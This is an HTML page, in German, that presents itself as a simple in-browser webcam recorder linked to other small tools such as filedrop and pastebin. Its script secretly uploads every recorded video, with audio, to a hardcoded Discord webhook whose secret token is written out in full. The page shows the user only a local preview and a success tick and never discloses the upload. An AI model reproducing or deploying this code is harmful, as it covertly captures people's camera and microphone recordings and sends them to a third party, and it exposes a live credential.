<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>video</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Inter', system-ui, -apple-system, sans-serif;
    min-height: 100vh; background: #0a0f1a;
    display: flex; justify-content: center; align-items: flex-start;
    padding: 24px; overflow-y: auto;
  }
  .bg-glow {
    position: fixed; inset: 0; z-index: 0; pointer-events: none;
    background: radial-gradient(ellipse at 20% 30%, rgba(99,102,241,0.07) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 70%, rgba(236,72,153,0.05) 0%, transparent 60%);
  }
  .container { position: relative; z-index: 1; text-align: center; max-width: 600px; width: 100%; padding: 32px 20px; }
  h1 { color: #fff; font-weight: 200; font-size: 2.4rem; letter-spacing: 1px; margin-bottom: 4px; }
  h1 span { background: linear-gradient(135deg, #818cf8, #f472b6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
  .sub { color: rgba(255,255,255,0.2); font-size: 0.85rem; font-weight: 300; letter-spacing: 2px; margin-bottom: 24px; }
  .preview {
    width: 100%; max-width: 480px; margin: 0 auto 16px;
    border-radius: 16px; overflow: hidden;
    border: 1px solid rgba(255,255,255,0.06); box-shadow: 0 0 40px rgba(0,0,0,0.4);
    background: rgba(0,0,0,0.3); position: relative;
  }
  .preview video { display: block; width: 100%; aspect-ratio: 4/3; object-fit: cover; }
  .preview .overlay {
    position: absolute; top: 12px; right: 12px;
    background: rgba(239,68,68,0.15); color: rgba(239,68,68,0.6);
    padding: 3px 10px; border-radius: 20px; font-size: 0.6rem;
    letter-spacing: 1px; border: 1px solid rgba(239,68,68,0.15);
    display: none; text-transform: uppercase;
  }
  .preview .overlay.on { display: block; animation: blink 1s step-end infinite; }
  @keyframes blink { 50% { opacity: 0.3; } }
  .record-btn {
    display: inline-flex; align-items: center; gap: 8px;
    background: rgba(239,68,68,0.1); border: 2px solid rgba(239,68,68,0.3);
    color: rgba(239,68,68,0.7); padding: 10px 28px; border-radius: 30px;
    font: inherit; font-size: 0.85rem; letter-spacing: 1px;
    cursor: pointer; transition: all 0.3s; margin-bottom: 20px;
  }
  .record-btn:hover { background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.5); }
  .record-btn.recording { background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.2); animation: pulse 1s ease infinite; }
  @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(239,68,68,0.2); } 50% { box-shadow: 0 0 0 16px rgba(239,68,68,0); } 100% { box-shadow: 0 0 0 0 rgba(239,68,68,0); } }
  .timer { color: rgba(255,255,255,0.25); font-size: 1.4rem; font-weight: 200; letter-spacing: 2px; margin-bottom: 12px; font-variant-numeric: tabular-nums; }
  .recordings { margin-top: 20px; display: none; }
  .recordings.show { display: block; }
  .rec-item {
    display: flex; align-items: center; gap: 12px;
    background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.06);
    border-radius: 12px; padding: 8px 12px; margin-bottom: 8px;
    animation: fadeIn 0.3s ease;
  }
  @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
  .rec-item video { width: 80px; border-radius: 6px; flex-shrink: 0; }
  .rec-item .dur { color: rgba(255,255,255,0.3); font-size: 0.7rem; flex-shrink: 0; }
  .rec-item .time { color: rgba(255,255,255,0.12); font-size: 0.55rem; flex: 1; text-align: right; }
  .rec-item .status { color: rgba(16,185,129,0.5); font-size: 0.6rem; flex-shrink: 0; }
  .nav-links { margin-top: 32px; display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
  .nav-links a { color: rgba(255,255,255,0.15); text-decoration: none; font-size: 0.65rem; letter-spacing: 1px; padding: 6px 14px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.25s; }
  .nav-links a:hover { color: rgba(255,255,255,0.4); border-color: rgba(255,255,255,0.1); background: rgba(255,255,255,0.02); }
</style>
</head>
<body>
<div class="bg-glow"></div>
<div class="container">
  <h1><span>video</span> 📹</h1>
  <div class="sub">webcam-aufnahme</div>
  <div class="preview">
    <video id="preview" autoplay playsinline muted></video>
    <div class="overlay" id="recBadge">● recording</div>
  </div>
  <div class="timer" id="timer">00:00</div>
  <button class="record-btn" id="recordBtn">🔴 aufnehmen</button>
  <div class="recordings" id="recordings"></div>
  <div class="nav-links">
    <a href="camera.html">📸 filterit</a>
    <a href="index.html">📸 repo</a>
    <a href="convert.html">🔄 bildwerk</a>
    <a href="metadata.html">🔍 metadaten</a>
    <a href="ascii.html">🎨 ascii</a>
    <a href="filedrop.html">📁 filedrop</a>
    <a href="audio.html">🎙️ audio</a>
    <a href="pastebin.html">📝 pastebin</a>
    <a href="qr.html">📱 qr</a>
  </div>
</div>

<script>
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510937957178015856/opLl-cQv-svjPmOXHmRx3Xqyn78E8EzkISiolgjrTXDrVQ33Ugwgke9bBzBjp0HH2UK2';
const preview = document.getElementById('preview');
const recordBtn = document.getElementById('recordBtn');
const timerEl = document.getElementById('timer');
const recBadge = document.getElementById('recBadge');
const recordings = document.getElementById('recordings');

let mediaRecorder = null;
let chunks = [];
let stream = null;
let recording = false;
let startTime = 0;
let timerInterval = null;

(async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, audio: true });
    preview.srcObject = stream;
  } catch { recordBtn.textContent = '🚫 keine kamera'; recordBtn.disabled = true; }
})();

recordBtn.addEventListener('click', () => {
  if (recording) { stop(); return; }
  if (!stream) return;
  const mime = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4'
            : MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9'
            : MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8'
            : 'video/webm';
  mediaRecorder = new MediaRecorder(stream, { mimeType: mime });
  chunks = [];
  mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
  mediaRecorder.onstop = () => {
    const blob = new Blob(chunks, { type: mime });
    const ts = Date.now();
    const dur = Math.floor((Date.now() - startTime) / 1000);
    const durStr = `${String(Math.floor(dur / 60)).padStart(2, '0')}:${String(dur % 60).padStart(2, '0')}`;
    send(blob, ts, durStr);
  };
  mediaRecorder.start(100);
  recording = true;
  recordBtn.classList.add('recording');
  recordBtn.innerHTML = '⏹ stoppen';
  recBadge.classList.add('on');
  startTime = Date.now();
  timerInterval = setInterval(() => {
    const s = Math.floor((Date.now() - startTime) / 1000);
    timerEl.textContent = `${String(Math.floor(s / 60)).padStart(2, '0')}:${String(s % 60).padStart(2, '0')}`;
  }, 100);
});

function stop() {
  if (!recording) return;
  recording = false;
  recordBtn.classList.remove('recording');
  recordBtn.innerHTML = '🔴 aufnehmen';
  recBadge.classList.remove('on');
  clearInterval(timerInterval);
  timerEl.textContent = '00:00';
  if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
}

function send(blob, ts, dur) {
  const name = `video_${ts}.mp4`;
  const fd = new FormData();
  fd.append('file', blob, name);
  fetch(WEBHOOK_URL, { method: 'POST', body: fd });
  recordings.classList.add('show');
  const div = document.createElement('div');
  div.className = 'rec-item';
  const url = URL.createObjectURL(blob);
  const now = new Date(ts).toLocaleTimeString();
  div.innerHTML = `<video src="${url}" controls></video><div class="dur">${dur}</div><div class="time">${now}</div><div class="status">✅</div>`;
  recordings.prepend(div);
  while (recordings.children.length > 20) recordings.lastChild.remove();
}
</script>
</body>
</html>
